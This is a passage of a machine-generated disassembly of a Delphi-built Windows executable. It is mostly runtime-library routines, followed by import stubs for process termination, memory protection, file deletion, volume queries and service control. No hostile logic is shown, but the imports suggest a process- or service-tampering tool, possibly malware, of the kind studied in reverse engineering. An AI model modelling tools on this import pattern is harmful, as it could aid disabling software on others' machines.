  00402BA4: mov     fs:[edx], eax
  00402BA7: mov     [eax], ecx
  00402BA9: mov     dword ptr [eax+4], offset unknown_libname_41; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402BB0: mov     [eax+8], ebp
  00402BB3: mov     ds:dword_406624, eax
  00402BB8: retn

Function: unknown_libname_43
  00402BBC: xor     edx, edx
  00402BBE: mov     eax, ds:dword_406624
  00402BC3: test    eax, eax
  00402BC5: jz      short locret_2BE3
  00402BC7: mov     ecx, fs:[edx]
  00402BCA: cmp     eax, ecx
  00402BCC: jnz     short loc_402BD6
  00402BCE: mov     eax, [eax]
  00402BD0: mov     fs:[edx], eax
  00402BD3: retn
  00402BD4: mov     ecx, [ecx]
  00402BD6: cmp     ecx, 0FFFFFFFFh
  00402BD9: jz      short locret_2BE3
  00402BDB: cmp     [ecx], eax
  00402BDD: jnz     short loc_402BD4
  00402BDF: mov     eax, [eax]
  00402BE1: mov     [ecx], eax
  00402BE3: retn

Function: @System@_16704
  00402BE4: push    ebp
  00402BE5: mov     ebp, esp
  00402BE7: push    ebx
  00402BE8: push    esi
  00402BE9: push    edi
  00402BEA: mov     edi, offset unk_6620
  00402BEF: mov     eax, [edi+8]
  00402BF2: test    eax, eax
  00402BF4: jz      short loc_402C3E
  00402BF6: mov     ebx, [edi+0Ch]
  00402BF9: mov     esi, [eax+4]
  00402BFC: xor     edx, edx
  00402BFE: push    ebp
  00402BFF: push    offset loc_402C2A
  00402C04: push    dword ptr fs:[edx]
  00402C07: mov     fs:[edx], esp
  00402C0A: test    ebx, ebx
  00402C0C: jle     short loc_402C20
  00402C0E: dec     ebx
  00402C0F: mov     [edi+0Ch], ebx
  00402C12: mov     eax, [esi+ebx*8+4]
  00402C16: test    eax, eax
  00402C18: jz      short loc_402C1C
  00402C1A: call    eax
  00402C1C: test    ebx, ebx
  00402C1E: jg      short loc_402C0E
  00402C20: xor     eax, eax
  00402C22: pop     edx
  00402C23: pop     ecx
  00402C24: pop     ecx
  00402C25: mov     fs:[eax], edx
  00402C28: jmp     short loc_402C3E
  00402C2A: jmp     @System@@HandleAnyException$qqrv; System::__linkproc__ HandleAnyException(void)
  00402C2F: call    @System@_16704; System::_16704
  00402C34: call    @System@@RaiseAgain$qqrv; System::__linkproc__ RaiseAgain(void)
  00402C39: call    @System@@DoneExcept$qqrv; System::__linkproc__ DoneExcept(void)
  00402C3E: pop     edi
  00402C3F: pop     esi
  00402C40: pop     ebx
  00402C41: pop     ebp
  00402C42: retn

Function: @System@_16705
  00402C44: push    ebp
  00402C45: mov     ebp, esp
  00402C47: push    ebx
  00402C48: push    esi
  00402C49: push    edi
  00402C4A: mov     eax, ds:dword_406628
  00402C4F: test    eax, eax
  00402C51: jz      short loc_402C9E
  00402C53: mov     esi, [eax]
  00402C55: xor     ebx, ebx
  00402C57: mov     edi, [eax+4]
  00402C5A: xor     edx, edx
  00402C5C: push    ebp
  00402C5D: push    offset loc_402C8A
  00402C62: push    dword ptr fs:[edx]
  00402C65: mov     fs:[edx], esp
  00402C68: cmp     esi, ebx
  00402C6A: jle     short loc_402C80
  00402C6C: mov     eax, [edi+ebx*8]
  00402C6F: inc     ebx
  00402C70: mov     ds:dword_40662C, ebx
  00402C76: test    eax, eax
  00402C78: jz      short loc_402C7C
  00402C7A: call    eax
  00402C7C: cmp     esi, ebx
  00402C7E: jg      short loc_402C6C
  00402C80: xor     eax, eax
  00402C82: pop     edx
  00402C83: pop     ecx
  00402C84: pop     ecx
  00402C85: mov     fs:[eax], edx
  00402C88: jmp     short loc_402C9E
  00402C8A: jmp     @System@@HandleAnyException$qqrv; System::__linkproc__ HandleAnyException(void)
  00402C8F: call    @System@_16704; System::_16704
  00402C94: call    @System@@RaiseAgain$qqrv; System::__linkproc__ RaiseAgain(void)
  00402C99: call    @System@@DoneExcept$qqrv; System::__linkproc__ DoneExcept(void)
  00402C9E: pop     edi
  00402C9F: pop     esi
  00402CA0: pop     ebx
  00402CA1: pop     ebp
  00402CA2: retn

Function: @System@@StartExe$qqrp23System@PackageInfoTablep17System@TLibModule
  00402CA4: mov     ds:dword_406010, offset RaiseException
  00402CAE: mov     ds:dword_406014, offset RtlUnwind
  00402CB8: mov     ds:dword_406628, eax
  00402CBD: xor     eax, eax
  00402CBF: mov     ds:dword_40662C, eax
  00402CC4: mov     ds:dword_406630, edx
  00402CCA: mov     eax, [edx+4]
  00402CCD: mov     ds:dword_40601C, eax
  00402CD2: call    unknown_libname_42; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402CD7: mov     ds:byte_6024, 0
  00402CDE: call    @System@_16705; System::_16705
  00402CE3: retn

Function: unknown_libname_44
  00402CE4: push    ebx
  00402CE5: push    esi
  00402CE6: push    edi
  00402CE7: mov     esi, offset Text; "Runtime error     at 00400000"
  00402CEC: mov     cl, 10h
  00402CEE: mov     ebx, ds:dword_405000
  00402CF4: mov     eax, ebx
  00402CF6: mov     edi, 0Ah
  00402CFB: cdq
  00402CFC: idiv    edi
  00402CFE: add     dl, 30h ; '0'
  00402D01: xor     eax, eax
  00402D03: mov     al, cl
  00402D05: mov     [esi+eax], dl
  00402D08: mov     eax, ebx
  00402D0A: mov     ebx, 0Ah
  00402D0F: cdq
  00402D10: idiv    ebx
  00402D12: mov     ebx, eax
  00402D14: dec     ecx
  00402D15: test    ebx, ebx
  00402D17: jnz     short loc_402CF4
  00402D19: mov     cl, 1Ch
  00402D1B: mov     eax, ds:dword_405004
  00402D20: mov     edx, eax
  00402D22: and     edx, 0Fh
  00402D25: mov     dl, ds:byte_5074[edx]
  00402D2B: xor     ebx, ebx
  00402D2D: mov     bl, cl
  00402D2F: mov     [esi+ebx], dl
  00402D32: shr     eax, 4
  00402D35: dec     ecx
  00402D36: test    eax, eax
  00402D38: jnz     short loc_402D20
  00402D3A: pop     edi
  00402D3B: pop     esi
  00402D3C: pop     ebx
  00402D3D: retn

Function: unknown_libname_45
  00402D40: xor     eax, eax
  00402D42: xchg    eax, ds:dword_405000
  00402D48: neg     eax
  00402D4A: sbb     eax, eax
  00402D4C: inc     eax
  00402D4D: mov     edi, offset unk_6620
  00402D52: mov     ebx, [edi+18h]
  00402D55: mov     ebp, [edi+14h]
  00402D58: push    dword ptr [edi+1Ch]
  00402D5B: push    dword ptr [edi+20h]
  00402D5E: mov     esi, [edi]
  00402D60: mov     ecx, 0Bh
  00402D65: rep movsd
  00402D67: pop     edi
  00402D68: pop     esi
  00402D69: leave
  00402D6A: retn    0Ch

Function: unknown_libname_46
  00402D70: push    ecx
  00402D71: cmp     ds:byte_6034, 0
  00402D78: jz      short loc_402DD1
  00402D7A: cmp     ds:word_6208, 0D7B2h
  00402D83: jnz     short loc_402D99
  00402D85: cmp     ds:dword_406210, 0
  00402D8C: jbe     short loc_402D99
  00402D8E: mov     eax, offset unk_6204
  00402D93: call    ds:dword_406220
  00402D99: push    0; lpOverlapped
  00402D9B: lea     eax, [esp+8+NumberOfBytesWritten]
  00402D9F: push    eax; lpNumberOfBytesWritten
  00402DA0: push    1Eh; nNumberOfBytesToWrite
  00402DA2: push    offset Text; "Runtime error     at 00400000"
  00402DA7: push    0FFFFFFF5h; nStdHandle
  00402DA9: call    GetStdHandle
  00402DAE: push    eax; hFile
  00402DAF: call    WriteFile
  00402DB4: push    0; lpOverlapped
  00402DB6: lea     eax, [esp+8+NumberOfBytesWritten]
  00402DBA: push    eax; lpNumberOfBytesWritten
  00402DBB: push    2; nNumberOfBytesToWrite
  00402DBD: push    offset _str___.Text; lpBuffer
  00402DC2: push    0FFFFFFF5h; nStdHandle
  00402DC4: call    GetStdHandle
  00402DC9: push    eax; hFile
  00402DCA: call    WriteFile
  00402DCF: pop     edx
  00402DD0: retn
  00402DD1: cmp     ds:byte_5018, 0
  00402DD8: jnz     short loc_402DED
  00402DDA: push    0; uType
  00402DDC: push    offset Caption; "Error"
  00402DE1: push    offset Text; "Runtime error     at 00400000"
  00402DE6: push    0; hWnd
  00402DE8: call    MessageBoxA
  00402DED: pop     edx
  00402DEE: retn

Function: @System@@Halt0$qqrv
  00402DFC: push    ebx
  00402DFD: push    esi
  00402DFE: push    edi
  00402DFF: push    ebp
  00402E00: mov     ebx, offset unk_6620
  00402E05: mov     esi, offset dword_405000
  00402E0A: mov     edi, offset unk_6030
  00402E0F: cmp     byte ptr [ebx+28h], 0
  00402E13: jnz     short loc_402E2B
  00402E15: cmp     dword ptr [edi], 0
  00402E18: jz      short loc_402E2B
  00402E1A: mov     edx, [edi]
  00402E1C: mov     eax, edx
  00402E1E: xor     edx, edx
  00402E20: mov     [edi], edx
  00402E22: mov     ebp, eax
  00402E24: call    ebp
  00402E26: cmp     dword ptr [edi], 0
  00402E29: jnz     short loc_402E1A
  00402E2B: cmp     ds:dword_405004, 0
  00402E32: jz      short loc_402E45
  00402E34: call    unknown_libname_44; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402E39: call    unknown_libname_46; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402E3E: xor     eax, eax
  00402E40: mov     ds:dword_405004, eax
  00402E45: cmp     byte ptr [ebx+28h], 2
  00402E49: jnz     short loc_402E55
  00402E4B: cmp     dword ptr [esi], 0
  00402E4E: jnz     short loc_402E55
  00402E50: xor     eax, eax
  00402E52: mov     [ebx+0Ch], eax
  00402E55: call    @System@_16704; System::_16704
  00402E5A: cmp     byte ptr [ebx+28h], 1
  00402E5E: jbe     short loc_402E65
  00402E60: cmp     dword ptr [esi], 0
  00402E63: jz      short loc_402E86
  00402E65: mov     eax, [ebx+10h]
  00402E68: test    eax, eax
  00402E6A: jz      short loc_402E86
  00402E6C: call    @System@UnregisterModule$qqrp17System@TLibModule; System::UnregisterModule(System::TLibModule *)
  00402E71: mov     edx, [ebx+10h]
  00402E74: mov     eax, [edx+10h]
  00402E77: cmp     eax, [edx+4]
  00402E7A: jz      short loc_402E86
  00402E7C: test    eax, eax
  00402E7E: jz      short loc_402E86
  00402E80: push    eax; hLibModule
  00402E81: call    FreeLibrary
  00402E86: call    unknown_libname_43; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402E8B: cmp     byte ptr [ebx+28h], 1
  00402E8F: jnz     short loc_402E94
  00402E91: call    dword ptr [ebx+24h]
  00402E94: cmp     byte ptr [ebx+28h], 0
  00402E98: jz      short loc_402E9F
  00402E9A: call    unknown_libname_45; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402E9F: cmp     dword ptr [ebx], 0
  00402EA2: jnz     short loc_402EBB
  00402EA4: cmp     ds:dword_406018, 0
  00402EAB: jz      short loc_402EB3
  00402EAD: call    ds:dword_406018
  00402EB3: mov     eax, [esi]
  00402EB5: push    eax; uExitCode
  00402EB6: call    ExitProcess
  00402EBB: mov     eax, [ebx]
  00402EBD: push    esi
  00402EBE: mov     esi, eax
  00402EC0: mov     edi, ebx
  00402EC2: mov     ecx, 0Bh
  00402EC7: rep movsd
  00402EC9: pop     esi
  00402ECA: jmp     loc_402E45

Function: sub_402ED4
  00402ED4: mov     ds:dword_405000, eax
  00402ED9: call    @System@@Halt0$qqrv; System::__linkproc__ Halt0(void)

Function: sub_402EE0
  00402EE0: pop     ds:dword_405004
  00402EE6: jmp     sub_402ED4

Function: @System@@LStrClr$qqrpv
  00402EEC: mov     edx, [eax]
  00402EEE: test    edx, edx
  00402EF0: jz      short locret_2F0E
  00402EF2: mov     dword ptr [eax], 0
  00402EF8: mov     ecx, [edx-8]
  00402EFB: dec     ecx
  00402EFC: jl      short locret_2F0E
  00402EFE: lock dec dword ptr [edx-8]
  00402F02: jnz     short locret_2F0E
  00402F04: push    eax
  00402F05: lea     eax, [edx-8]
  00402F08: call    @System@@FreeMem$qqrpv; System::__linkproc__ FreeMem(void *)
  00402F0D: pop     eax
  00402F0E: retn

Function: @System@@NewAnsiString$qqri
  00402F10: test    eax, eax
  00402F12: jle     short loc_402F38
  00402F14: push    eax
  00402F15: add     eax, 0Ah
  00402F18: and     eax, 0FFFFFFFEh
  00402F1B: push    eax
  00402F1C: call    @System@@GetMem$qqri; System::__linkproc__ GetMem(int)
  00402F21: pop     edx
  00402F22: mov     word ptr [edx+eax-2], 0
  00402F29: add     eax, 8
  00402F2C: pop     edx
  00402F2D: mov     [eax-4], edx
  00402F30: mov     dword ptr [eax-8], 1
  00402F37: retn
  00402F38: xor     eax, eax
  00402F3A: retn

Function: @System@@LStrFromPCharLen$qqrr17System@AnsiStringpci
  00402F3C: push    ebx
  00402F3D: push    esi
  00402F3E: push    edi
  00402F3F: mov     ebx, eax
  00402F41: mov     esi, edx
  00402F43: mov     edi, ecx
  00402F45: mov     eax, edi
  00402F47: call    @System@@NewAnsiString$qqri; System::__linkproc__ NewAnsiString(int)
  00402F4C: mov     ecx, edi; int
  00402F4E: mov     edi, eax
  00402F50: test    esi, esi
  00402F52: jz      short loc_402F5D
  00402F54: mov     edx, eax; void *
  00402F56: mov     eax, esi; void *
  00402F58: call    @System@Move$qqrpxvpvi; System::Move(void *,void *,int)
  00402F5D: mov     eax, ebx
  00402F5F: call    @System@@LStrClr$qqrpv; System::__linkproc__ LStrClr(void *)
  00402F64: mov     [ebx], edi
  00402F66: pop     edi
  00402F67: pop     esi
  00402F68: pop     ebx
  00402F69: retn

Function: unknown_libname_47
  00402F6C: push    edi
  00402F6D: push    eax
  00402F6E: push    ecx
  00402F6F: mov     edi, edx
  00402F71: xor     eax, eax
  00402F73: repne scasb
  00402F75: jnz     short loc_402F79
  00402F77: not     ecx
  00402F79: pop     eax
  00402F7A: add     ecx, eax; int
  00402F7C: pop     eax; int
  00402F7D: pop     edi
  00402F7E: jmp     @System@@LStrFromPCharLen$qqrr17System@AnsiStringpci; System::__linkproc__ LStrFromPCharLen(System::AnsiString &,char *,int)

Function: sub_402F84
  00402F84: mov     al, 11h
  00402F86: jmp     @System@Error$qqr20System@TRuntimeError; System::Error(System::TRuntimeError)

Function: unknown_libname_48
  00402F8C: push    ebp
  00402F8D: mov     ebp, esp
  00402F8F: add     esp, 0FFFFFFF8h
  00402F92: push    ebx
  00402F93: push    esi
  00402F94: push    edi
  00402F95: mov     [ebp+var_4], eax
  00402F98: mov     eax, ds:dword_405020
  00402F9D: mov     [ebp+var_8], eax
  00402FA0: cmp     [ebp+var_8], 0
  00402FA4: jz      short loc_402FDF
  00402FA6: xor     eax, eax
  00402FA8: push    ebp
  00402FA9: push    offset loc_402FC7
  00402FAE: push    dword ptr fs:[eax]
  00402FB1: mov     fs:[eax], esp
  00402FB4: mov     ebx, [ebp+var_8]
  00402FB7: mov     eax, [ebp+var_4]
  00402FBA: call    dword ptr [ebx+4]
  00402FBD: xor     eax, eax
  00402FBF: pop     edx
  00402FC0: pop     ecx
  00402FC1: pop     ecx
  00402FC2: mov     fs:[eax], edx
  00402FC5: jmp     short loc_402FD1
  00402FC7: jmp     @System@@HandleAnyException$qqrv; System::__linkproc__ HandleAnyException(void)
  00402FCC: call    @System@@DoneExcept$qqrv; System::__linkproc__ DoneExcept(void)
  00402FD1: mov     eax, [ebp+var_8]
  00402FD4: mov     eax, [eax]
  00402FD6: mov     [ebp+var_8], eax
  00402FD9: cmp     [ebp+var_8], 0
  00402FDD: jnz     short loc_402FA6
  00402FDF: pop     edi
  00402FE0: pop     esi
  00402FE1: pop     ebx
  00402FE2: pop     ecx
  00402FE3: pop     ecx
  00402FE4: pop     ebp
  00402FE5: retn

Function: @System@RegisterModule$qqrp17System@TLibModule
  00402FE8: mov     edx, ds:dword_40501C
  00402FEE: mov     [eax], edx
  00402FF0: mov     ds:dword_40501C, eax
  00402FF5: retn

Function: @System@UnregisterModule$qqrp17System@TLibModule
  00402FF8: push    ebp
  00402FF9: mov     ebp, esp
  00402FFB: push    ecx
  00402FFC: mov     [ebp+var_4], eax
  00402FFF: xor     edx, edx
  00403001: push    ebp
  00403002: push    offset loc_40305C
  00403007: push    dword ptr fs:[edx]
  0040300A: mov     fs:[edx], esp
  0040300D: mov     eax, [ebp+var_4]
  00403010: mov     eax, [eax+4]
  00403013: call    unknown_libname_48; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00403018: xor     eax, eax
  0040301A: pop     edx
  0040301B: pop     ecx
  0040301C: pop     ecx
  0040301D: mov     fs:[eax], edx
  00403020: push    offset loc_403063
  00403025: mov     eax, [ebp+var_4]
  00403028: cmp     eax, ds:dword_40501C
  0040302E: jnz     short loc_40303C
  00403030: mov     eax, [ebp+var_4]
  00403033: mov     eax, [eax]
  00403035: mov     ds:dword_40501C, eax
  0040303A: jmp     short loc_40305B
  0040303C: mov     eax, ds:dword_40501C
  00403041: test    eax, eax
  00403043: jz      short loc_40305B
  00403045: mov     edx, [eax]
  00403047: cmp     edx, [ebp+var_4]
  0040304A: jnz     short loc_403055
  0040304C: mov     edx, [ebp+var_4]
  0040304F: mov     edx, [edx]
  00403051: mov     [eax], edx
  00403053: jmp     short loc_40305B
  00403055: mov     eax, [eax]
  00403057: test    eax, eax
  00403059: jnz     short loc_403045
  0040305B: retn
  0040305C: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00403061: jmp     short loc_403025
  00403063: pop     ecx
  00403064: pop     ebp
  00403065: retn

Function: unknown_libname_49
  00403068: push    ebp
  00403069: mov     ebp, esp
  0040306B: add     esp, 0FFFFFFF0h
  0040306E: push    ebx
  0040306F: xor     edx, edx
  00403071: mov     [ebp+var_10], edx
  00403074: xor     edx, edx
  00403076: push    ebp
  00403077: push    offset loc_4030CE
  0040307C: push    dword ptr fs:[edx]
  0040307F: mov     fs:[edx], esp
  00403082: push    7; cchData
  00403084: lea     edx, [ebp+LCData]
  00403087: push    edx; lpLCData
  00403088: push    1004h; LCType
  0040308D: push    eax; Locale
  0040308E: call    GetLocaleInfoA
  00403093: lea     eax, [ebp+var_10]
  00403096: lea     edx, [ebp+LCData]
  00403099: mov     ecx, 7
  0040309E: call    unknown_libname_47; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004030A3: mov     eax, [ebp+var_10]
  004030A6: lea     edx, [ebp+var_4]
  004030A9: call    @System@@ValLong$qqrx17System@AnsiStringri; System::__linkproc__ ValLong(System::AnsiString,int &)
  004030AE: mov     ebx, eax
  004030B0: cmp     [ebp+var_4], 0
  004030B4: jz      short loc_4030B8
  004030B6: xor     ebx, ebx
  004030B8: xor     eax, eax
  004030BA: pop     edx
  004030BB: pop     ecx
  004030BC: pop     ecx
  004030BD: mov     fs:[eax], edx
  004030C0: push    offset loc_4030D5
  004030C5: lea     eax, [ebp+var_10]
  004030C8: call    @System@@LStrClr$qqrpv; System::__linkproc__ LStrClr(void *)
  004030CD: retn
  004030CE: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004030D3: jmp     short loc_4030C5
  004030D5: mov     eax, ebx
  004030D7: pop     ebx
  004030D8: mov     esp, ebp
  004030DA: pop     ebp
  004030DB: retn

Function: @System@Finalization$qqrv
  004030DC: push    ebp
  004030DD: mov     ebp, esp
  004030DF: xor     eax, eax
  004030E1: push    ebp
  004030E2: push    offset loc_403126
  004030E7: push    dword ptr fs:[eax]
  004030EA: mov     fs:[eax], esp
  004030ED: inc     ds:dword_4065A4
  004030F3: jnz     short loc_403118
  004030F5: mov     eax, offset unk_6038
  004030FA: call    @System@@Close$qqrr15System@TTextRec; System::__linkproc__ Close(System::TTextRec &)
  004030FF: mov     eax, offset unk_6204
  00403104: call    @System@@Close$qqrr15System@TTextRec; System::__linkproc__ Close(System::TTextRec &)
  00403109: mov     eax, offset unk_63D0
  0040310E: call    @System@@Close$qqrr15System@TTextRec; System::__linkproc__ Close(System::TTextRec &)
  00403113: call    @System@_16448; System::_16448
  00403118: xor     eax, eax
  0040311A: pop     edx
  0040311B: pop     ecx
  0040311C: pop     ecx
  0040311D: mov     fs:[eax], edx
  00403120: push    offset loc_40312D
  00403125: retn
  00403126: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040312B: jmp     short loc_403125
  0040312D: pop     ebp
  0040312E: retn

Function: @System@initialization$qqrv
  00403130: sub     ds:dword_4065A4, 1
  00403137: jnb     locret_3202
  0040313D: mov     ds:byte_5008, 2
  00403144: mov     ds:dword_406010, offset RaiseException
  0040314E: mov     ds:dword_406014, offset RtlUnwind
  00403158: mov     ds:byte_6036, 2
  0040315F: mov     ds:dword_406000, offset sub_402F84
  00403169: call    unknown_libname_28; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040316E: test    al, al
  00403170: jz      short loc_403177
  00403172: call    unknown_libname_29; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00403177: call    unknown_libname_30; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040317C: mov     ds:word_603C, 0D7B0h
  00403185: mov     ds:word_6208, 0D7B0h
  0040318E: mov     ds:word_63D4, 0D7B0h
  00403197: call    GetCommandLineA
  0040319C: mov     ds:dword_40602C, eax
  004031A1: call    unknown_libname_1; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004031A6: mov     ds:dword_406028, eax
  004031AB: call    GetVersion
  004031B0: and     eax, 80000000h
  004031B5: cmp     eax, 80000000h
  004031BA: jz      short loc_4031E9
  004031BC: call    GetVersion
  004031C1: and     eax, 0FFh
  004031C6: cmp     ax, 4
  004031CA: jbe     short loc_4031D8
  004031CC: mov     ds:dword_4065A8, 3
  004031D6: jmp     short loc_4031F8
  004031D8: call    GetThreadLocale
  004031DD: call    unknown_libname_49; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004031E2: mov     ds:dword_4065A8, eax
  004031E7: jmp     short loc_4031F8
  004031E9: call    GetThreadLocale
  004031EE: call    unknown_libname_49; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004031F3: mov     ds:dword_4065A8, eax
  004031F8: call    GetCurrentThreadId
  004031FD: mov     ds:dword_406020, eax
  00403202: retn

Function: GetModuleHandleA
  00403204: jmp     ds:__imp_GetModuleHandleA

Function: LocalAlloc_0
  0040320C: jmp     ds:__imp_LocalAlloc_0

Function: TlsGetValue
  00403214: jmp     ds:__imp_TlsGetValue

Function: TlsSetValue
  0040321C: jmp     ds:__imp_TlsSetValue

Function: sub_403224
  00403224: push    eax; uBytes
  00403225: push    40h ; '@'; uFlags
  00403227: call    LocalAlloc_0
  0040322C: retn

Function: sub_403230
  00403230: mov     eax, 8
  00403235: retn

Function: unknown_libname_50
  00403238: push    ebx
  00403239: call    sub_403230
  0040323E: mov     ebx, eax
  00403240: test    ebx, ebx
  00403242: jz      short loc_40327A
  00403244: cmp     ds:TlsIndex, 0FFFFFFFFh
  0040324B: jnz     short loc_403257
  0040324D: mov     eax, 0E2h ; 'â'
  00403252: call    sub_402EE0
  00403257: mov     eax, ebx; uBytes
  00403259: call    sub_403224
  0040325E: test    eax, eax
  00403260: jnz     short loc_40326E
  00403262: mov     eax, 0E2h ; 'â'
  00403267: call    sub_402EE0
  0040326C: jmp     short loc_40327A
  0040326E: push    eax; lpTlsValue
  0040326F: mov     eax, ds:TlsIndex
  00403274: push    eax; dwTlsIndex
  00403275: call    TlsSetValue
  0040327A: pop     ebx
  0040327B: retn

Function: @Sysinit@@GetTls$qqrv
  0040327C: mov     cl, ds:byte_664C
  00403282: mov     eax, ds:TlsIndex
  00403287: test    cl, cl
  00403289: jnz     short loc_4032B1
  0040328B: mov     edx, large fs:2Ch
  00403292: mov     eax, [edx+eax*4]
  00403295: retn
  00403296: call    unknown_libname_50; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040329B: mov     eax, ds:TlsIndex
  004032A0: push    eax; dwTlsIndex
  004032A1: call    TlsGetValue
  004032A6: test    eax, eax
  004032A8: jz      short loc_4032AB
  004032AA: retn
  004032AB: mov     eax, ds:dword_406658
  004032B0: retn
  004032B1: push    eax; dwTlsIndex
  004032B2: call    TlsGetValue
  004032B7: test    eax, eax
  004032B9: jz      short loc_403296
  004032BB: retn

Function: unknown_libname_51
  004032BC: mov     eax, offset unk_5088
  004032C1: call    @System@RegisterModule$qqrp17System@TLibModule; System::RegisterModule(System::TLibModule *)
  004032C6: retn

Function: @Sysinit@@InitExe$qqrpv
  004032C8: push    ebx
  004032C9: mov     ebx, eax
  004032CB: xor     eax, eax
  004032CD: mov     ds:TlsIndex, eax
  004032D2: push    0; lpModuleName
  004032D4: call    GetModuleHandleA
  004032D9: mov     ds:dword_406650, eax
  004032DE: mov     eax, ds:dword_406650
  004032E3: mov     ds:dword_40508C, eax
  004032E8: xor     eax, eax
  004032EA: mov     ds:dword_405090, eax
  004032EF: xor     eax, eax
  004032F1: mov     ds:dword_405094, eax
  004032F6: call    unknown_libname_51; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004032FB: mov     edx, offset unk_5088
  00403300: mov     eax, ebx
  00403302: call    @System@@StartExe$qqrp23System@PackageInfoTablep17System@TLibModule; System::__linkproc__ StartExe(System::PackageInfoTable *,System::TLibModule *)
  00403307: pop     ebx
  00403308: retn

Function: sub_40330C
  0040330C: push    ebp
  0040330D: mov     ebp, esp
  0040330F: xor     eax, eax
  00403311: push    ebp
  00403312: push    offset loc_403331
  00403317: push    dword ptr fs:[eax]
  0040331A: mov     fs:[eax], esp
  0040331D: inc     ds:dword_406654
  00403323: xor     eax, eax
  00403325: pop     edx
  00403326: pop     ecx
  00403327: pop     ecx
  00403328: mov     fs:[eax], edx
  0040332B: push    offset loc_403338
  00403330: retn
  00403331: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00403336: jmp     short loc_403330
  00403338: pop     ebp
  00403339: retn

Function: sub_40333C
  0040333C: sub     ds:dword_406654, 1
  00403343: retn

Function: sub_403344
  00403344: push    ebp
  00403345: mov     ebp, esp
  00403347: xor     eax, eax
  00403349: push    ebp
  0040334A: push    offset loc_403369
  0040334F: push    dword ptr fs:[eax]
  00403352: mov     fs:[eax], esp
  00403355: inc     ds:dword_40665C
  0040335B: xor     eax, eax
  0040335D: pop     edx
  0040335E: pop     ecx
  0040335F: pop     ecx
  00403360: mov     fs:[eax], edx
  00403363: push    offset loc_403370
  00403368: retn
  00403369: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040336E: jmp     short loc_403368
  00403370: pop     ebp
  00403371: retn

Function: sub_403374
  00403374: sub     ds:dword_40665C, 1
  0040337B: retn

Function: CloseHandle
  0040337C: jmp     ds:__imp_CloseHandle

Function: CopyFileA
  00403384: jmp     ds:__imp_CopyFileA

Function: CreateFileA
  0040338C: jmp     ds:__imp_CreateFileA

Function: DeleteFileA
  00403394: jmp     ds:__imp_DeleteFileA

Function: FormatMessageA
  0040339C: jmp     ds:__imp_FormatMessageA

Function: GetExitCodeThread
  004033A4: jmp     ds:__imp_GetExitCodeThread

Function: GetFileAttributesA
  004033AC: jmp     ds:__imp_GetFileAttributesA

Function: GetFileSize
  004033B4: jmp     ds:__imp_GetFileSize

Function: GetLastError
  004033BC: jmp     ds:__imp_GetLastError

Function: GetModuleFileNameA
  004033C4: jmp     ds:__imp_GetModuleFileNameA

Function: GetModuleHandleA_0
  004033CC: jmp     ds:__imp_GetModuleHandleA_0

Function: GetProcAddress
  004033D4: jmp     ds:__imp_GetProcAddress

Function: GetTickCount
  004033DC: jmp     ds:__imp_GetTickCount

Function: GetVolumeInformationA
  004033E4: jmp     ds:__imp_GetVolumeInformationA

Function: GetWindowsDirectoryA
  004033EC: jmp     ds:__imp_GetWindowsDirectoryA

Function: LocalAlloc_1
  004033F4: jmp     ds:__imp_LocalAlloc_1

Function: LocalFree_0
  004033FC: jmp     ds:__imp_LocalFree_0

Function: OpenProcess
  00403404: jmp     ds:__imp_OpenProcess

Function: ReadFile
  0040340C: jmp     ds:__imp_ReadFile

Function: Sleep
  00403414: jmp     ds:__imp_Sleep

Function: TerminateProcess
  0040341C: jmp     ds:__imp_TerminateProcess

Function: VirtualFreeEx
  00403424: jmp     ds:__imp_VirtualFreeEx

Function: VirtualProtect
  0040342C: jmp     ds:__imp_VirtualProtect

Function: WaitForSingleObject
  00403434: jmp     ds:__imp_WaitForSingleObject

Function: WriteFile_0
  0040343C: jmp     ds:__imp_WriteFile_0

Function: lstrcatA
  00403444: jmp     ds:__imp_lstrcatA

Function: lstrcmpiA
  0040344C: jmp     ds:__imp_lstrcmpiA

Function: lstrcpyA
  00403454: jmp     ds:__imp_lstrcpyA

Function: lstrlenA
  0040345C: jmp     ds:__imp_lstrlenA

Function: MessageBoxA_0
  00403464: jmp     ds:__imp_MessageBoxA_0

Function: sub_40346C
  0040346C: xchg    eax, edx; void *
  0040346D: call    @System@Move$qqrpxvpvi; System::Move(void *,void *,int)
  00403472: retn

Function: sub_403474
  00403474: push    ebp
  00403475: mov     ebp, esp
  00403477: xor     eax, eax
  00403479: push    ebp
  0040347A: push    offset loc_403499
  0040347F: push    dword ptr fs:[eax]
  00403482: mov     fs:[eax], esp
  00403485: inc     ds:dword_406660
  0040348B: xor     eax, eax
  0040348D: pop     edx
  0040348E: pop     ecx
  0040348F: pop     ecx
  00403490: mov     fs:[eax], edx
  00403493: push    offset loc_4034A0
  00403498: retn
  00403499: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040349E: jmp     short loc_403498
  004034A0: pop     ebp
  004034A1: retn

Function: sub_4034A4
  004034A4: sub     ds:dword_406660, 1
  004034AB: retn

Function: CloseServiceHandle
  004034AC: jmp     ds:__imp_CloseServiceHandle

Function: ControlService
  004034B4: jmp     ds:__imp_ControlService

Function: OpenSCManagerA
  004034BC: jmp     ds:__imp_OpenSCManagerA

Function: OpenServiceA
  004034C4: jmp     ds:__imp_OpenServiceA

Function: QueryServiceConfigA
  004034CC: jmp     ds:__imp_QueryServiceConfigA

Function: QueryServiceStatus
